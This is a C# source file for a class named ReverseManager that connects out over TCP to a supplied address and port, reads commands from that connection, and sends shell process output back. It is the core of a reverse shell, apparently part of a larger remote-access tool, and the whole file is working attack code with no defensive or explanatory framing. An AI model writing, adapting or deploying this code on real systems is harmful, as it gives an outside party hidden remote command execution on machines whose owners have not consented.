using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;
using Enums;

namespace ISBD
{
    public static class ReverseManager
    {
        private static TcpClient ourClient;
        private static Stream ourNetworkStream;
        private static StreamReader ourStreamReader;
        private static StreamWriter ourStreamWriter;
        private static IShell ourShell;

        public static void Initialize(IPAddress aReverseAddress, int aPort, ShellType aShellType = ShellType.LovelyDay)
        {
            ourClient = new TcpClient();
            ourClient.Connect(aReverseAddress, aPort);
            Console.Write("Connected to: {0}:{1}", aReverseAddress, aPort);
            ourNetworkStream = ourClient.GetStream();
            ourStreamReader = new StreamReader(ourNetworkStream);
            ourStreamWriter = new StreamWriter(ourNetworkStream);

            ourShell = ShellFactory.Create(aShellType);
        }

        public static void WriteStream(string someData)
        {
            ourShell.WriteStream(someData);
        }

        public static string ReadStream()
        {
            return ourShell.ReadStream();
        }

        public static string WaitForCommand()
        {
            return ourStreamReader.ReadLine();
        }
        
        public static void OutputHandler(object aSender, DataReceivedEventArgs eventMessage)
        {
            if (!string.IsNullOrEmpty(eventMessage.Data))
            {
                ourStreamWriter.WriteLine("\n" + eventMessage.Data);
                ourStreamWriter.Flush();
            }
        }
    }
}
